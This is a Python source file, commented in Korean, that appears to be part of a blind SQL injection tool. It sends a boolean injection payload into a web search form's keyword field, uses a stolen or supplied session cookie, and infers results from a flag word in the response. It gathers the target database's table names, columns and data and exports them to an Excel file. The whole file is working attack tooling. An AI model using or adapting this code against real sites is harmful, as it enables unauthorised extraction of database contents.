import requests
import pandas as pd


class attackData:
    def __init__(self):
        self.base_url = ""
        self.cookies = { "JSESSIONID": "" }
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        self.DB_type = "oracle"

        self.data = {
            'searchType':'all',
            'keyword': "test%' and (1=1) and '1%'='1"}
        self.query = ""
        self.flag_word = "nywtest"

        

    def show(self):
        print(f"\nbase URL = {self.base_url}")
        print(f"SessionID = {self.cookies['JSESSIONID']}")
        print(f"설정된 공격 쿼리 : {self.data['keyword']}")
        print(f"true 판별 기준(flag_word) = {self.flag_word}")

    def set_url(self,new_url):
        self.base_url = new_url

    def set_query(self,attack_query):
        self.data['keyword'] = attack_query

    def set_cookies(self,cookie):
        self.cookies = cookie
    
    def set_sessionID(self,sessionID):
        self.cookies['JSESSIONID'] = sessionID
    
    def set_flag_word(self,word):
        self.flag_word = word
    
    def set_DB_type(self,type):
        self.DB_type = type

    def send_get_request(self,url):
        #요청 보내기
        res = requests.get(url, cookies=self.cookies)
        if '권한' in res.text:
            print("세션 ID 교체") 
            return False
        elif self.flag_word in res.text:
            return False
        else:
            return True
        
    def send_post_request(self,request_string=""):
        #요청 보내기

        if(request_string != ""):
            self.set_query(request_string)

        res = requests.post(self.base_url, cookies=self.cookies, data=self.data, headers=self.headers)
        
        #print(res.text)
        if '권한' in res.text:
            print("\n세션 ID 교체") 
            return False
        elif self.flag_word in res.text:
            return True
        else:
            return False
        
class tableInfo:
    def __init__(self):
        self.tables=[]
        self.columns={}
        self.datas={}

    def append_table(self,table):
        self.tables.append(table)
        self.columns[table]=[]
        self.datas[table]={}

    def append_column(self,table_name,column_name):
        self.columns[table_name].append(column_name)
        self.datas[table_name][column_name]=[]
        

    def append_datas(self,table_name,column_name,data):
        self.datas[table_name][column_name].append(data)
    
    def get_counts(self,type):
        if type=='table':
            return self.table_count
        
        elif type=='column':
            return self.column_counts
        
        elif type=='data':
            return self.data_counts
    def show_tables(self):
        print(f'\ntable = {self.tables}')
    
    def show_columns(self):
        for key in self.columns:
            print(f"{key}")
            print("-"*20)
            print(f"{self.columns[key]}\n")


    def show_data(self,table_name):
        
        data = self.datas[table_name]

        keys = list(data.keys())
        num_rows = len(data[keys[0]])

        print()
        print(f'table = {table_name}')
        # Print header
        max_lens = 15
        header = ' | '.join(f'{key:<{max_lens}}' for i, key in enumerate(keys))
        print(header)
        print('-' * (max_lens *6))

        # Print data
        for i in range(num_rows):
            row = ' | '.join(f'{data[key][i]:<{max_lens}}' for j, key in enumerate(keys))
            print(row)

    def export_data_xlsx(self):
        dfs = []
        for table, columns in self.columns.items():
            df = pd.DataFrame(self.datas[table], columns=columns)
            dfs.append(df)

        # Excel 파일로 내보내기
        with pd.ExcelWriter('output.xlsx') as writer:
            for i, table in enumerate(self.tables):
                dfs[i].to_excel(writer, sheet_name=table, index=False)

            






    

